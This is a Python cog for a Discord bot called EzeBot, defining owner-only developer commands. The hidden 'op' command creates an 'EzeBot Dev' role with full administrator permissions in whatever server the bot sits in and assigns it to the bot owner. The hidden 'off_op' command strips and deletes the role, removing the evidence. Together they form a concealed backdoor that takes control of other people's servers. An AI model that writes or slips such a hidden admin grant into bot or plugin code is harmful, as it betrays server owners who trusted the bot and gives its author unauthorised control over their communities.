import discord
from discord.ext import commands
import dbfn
from dbfn import reactionbook
import traceback
from traceback import format_exception

class devCommands(commands.Cog):
    def __init__(self, client):
        self.client = client


    @commands.command(hidden = True)
    @commands.is_owner()
    async def op(self, ctx):
        try:
            role = await ctx.guild.create_role(name="EzeBot Dev")
            permissions = discord.Permissions()
            permissions.update(administrator=True)
            await role.edit(position=ctx.guild.me.top_role.position-2, permissions=permissions)
            user = ctx.message.author
            await user.add_roles(role)
            await ctx.message.add_reaction("✅")
        except discord.Forbidden:
            await ctx.send("I do not have permission to do this!")

    
    @commands.command(hidden = True)
    @commands.is_owner()
    async def off_op(self, ctx):

        try:           
            user = ctx.message.author
            role = discord.utils.get(ctx.guild.roles, name='EzeBot Dev')
            await user.remove_roles(role)
            await role.delete()
            await ctx.message.add_reaction("✅")
            
        except discord.Forbidden:
            await ctx.send("I do not have permission to do this!")


    @commands.command(name="logout") #Will appreciate if someone fixed this!
    @commands.is_owner()
    async def logout(self, ctx):
        await ctx.send(f"Voiding process..")
        await self.client.logout()   





def setup(client):
    client.add_cog(devCommands(client))